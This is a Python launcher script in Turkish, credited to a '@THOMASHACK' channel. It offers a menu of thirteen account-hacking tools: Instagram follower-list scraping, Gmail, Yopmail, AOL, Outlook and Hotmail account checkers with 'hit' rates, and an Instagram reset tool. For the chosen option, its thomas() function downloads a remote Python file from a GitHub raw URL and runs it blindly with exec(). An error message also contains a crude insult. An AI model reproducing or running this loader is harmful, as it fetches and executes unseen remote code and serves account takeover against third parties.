import requests
import os
from cfonts import render          

  
      
kral = render('vip  [ V5 ] ', colors=['white', 'yellow'], align='center')
print("\x1b[1;39m—" * 60)
print(kral)
print("~ Programmer : @T5OMAS |  Channel: @THOMASHACK ~")
print("\x1b[1;39m—" * 60)






print(f"""\x1b[38;5;117m  1\x1b[38;5;231m - Listeyi Çekmek [ Takipçili ] | \x1b[1;32m Güncel Aktif ✅ 
\x1b[38;5;117m  2\x1b[38;5;231m - Listeyi Silmek [thomas.txt] | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  3\x1b[38;5;231m - Listeyi Taramak [ takipçili ]  | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  4\x1b[38;5;231m - İnsta [ Gmail ]  2012 | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  5\x1b[38;5;231m - Yopmail [ 2010- 2025 ] | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  6\x1b[38;5;231m - Gmail [ 2010- 2025 ] | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  7\x1b[38;5;231m - Aol [ 2012 - 2013 ] | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  8\x1b[38;5;231m - Outlook [ 2012 - 2013 ] | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  9\x1b[38;5;231m - Hotmail [ 2012 - 2013 ] | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  10\x1b[38;5;231m -  Instagram [ Username ] Tool | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  11\x1b[38;5;231m -  [ 2010 - 2019 ] %50 hit orani  | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  12\x1b[38;5;231m -  İnsta Reset Tool   | \x1b[1;32m Güncel Aktif ✅
\x1b[38;5;117m  13\x1b[38;5;231m -  [ 2010 - 2025 ]  Takipcili  | \x1b[1;32m Güncel Aktif ✅
""")




def shelby():
    print("\x1b[1;39m—" * 60)
    secim = input(" • Seçiminiz: ")
    baglantilar = {
        "1": "https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/%F0%9F%90%A5V%C4%B0PL%C4%B0ST.PY",
        "2": "https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/dosya_sil.py",
        "3": "https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/chk_gmail_thomas.py",
        "4":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/thomas_2012_gmail_tool%F0%9F%8C%B7hh.py",
        "5":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/thomas_yopmail_insta_tool_hhhxdhh.py",
        "6":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/%F0%9F%98%8E2010-2025_ninjapy.py",
        "7":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/aol_2012_ninjavpy.py",
        "8":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/%F0%9F%87%B9%F0%9F%87%B7out.py",
        "9":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/%F0%9F%87%B9%F0%9F%87%B7hot.py",
        "10":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/user.py",
        "11":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/2010hhh_ninjapy.py",
        "12":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/reset_email.py",
        "13":"https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/%5B2010-2025%5D%20%5Btakipcili%5D%20%5Bvip%5D%20_nignjapy.py"
        
    }
    if secim in baglantilar:
        thomas(baglantilar[secim])
    else:
        print(" oc 1 ile 3 arası bir sayi girecen amk mali ")
        shelby()
        
        
def thomas(url):
    try:        
        yanit = requests.get(url)
        yanit.raise_for_status()  
        kod = yanit.text
        print(kod)  
        os.system("clear")
        exec(kod)  
    except requests.exceptions.RequestException as hata:
        print(f" h - am {hata}")
    except Exception as hata:
        print(f" h  - am {hata}")
if __name__ == "__main__":
    shelby()
    # @t5omas / @thomashack
